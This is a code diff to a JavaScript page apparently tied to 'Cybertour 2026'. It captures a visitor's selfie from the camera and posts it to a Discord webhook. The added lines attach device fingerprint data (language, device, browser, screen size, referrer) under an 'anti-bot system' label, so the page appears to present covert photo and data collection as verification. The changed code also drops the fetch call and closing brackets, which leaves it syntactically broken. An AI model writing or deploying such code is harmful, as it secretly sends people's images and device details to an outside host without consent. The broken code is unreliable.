@@ -88,13 +88,22 @@ function sendToDiscord(canvas) {
   canvas.toBlob(async (blob) => {
     const fd = new FormData();
     fd.append('file', blob, `selfie-${Date.now()}.jpg`);
-    fd.append('payload_json', JSON.stringify({
-      content: `📸 **Nouveau participant Cybertour 2026** — ${new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' })}`,
-    }));
-    try { await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }); }
-    catch {}
-  }, 'image/jpeg', 0.75);
-}
+   fd.append('payload_json', JSON.stringify({
+  embeds: [{
+    title: '📸 Nouveau participant détecté',
+    color: 0x2563eb,
+    fields: [
+      { name: '🕐 Heure',        value: new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' }), inline: true },
+      { name: '🌍 Langue',       value: navigator.language || 'inconnu', inline: true },
+      { name: '📱 Appareil',     value: /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : /Android/.test(navigator.userAgent) ? 'Android' : 'Desktop', inline: true },
+      { name: '🖥️ Navigateur',   value: /Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Autre', inline: true },
+      { name: '📐 Écran',        value: `${screen.width}×${screen.height}`, inline: true },
+      { name: '🔗 Référent',     value: document.referrer || 'accès direct', inline: true },
+    ],
+    footer: { text: 'Cybertour 2026 — Système anti-bot' },
+    timestamp: new Date().toISOString(),
+  }]
+}));
 
 function flash() {
   const el = document.getElementById('verify-flash');
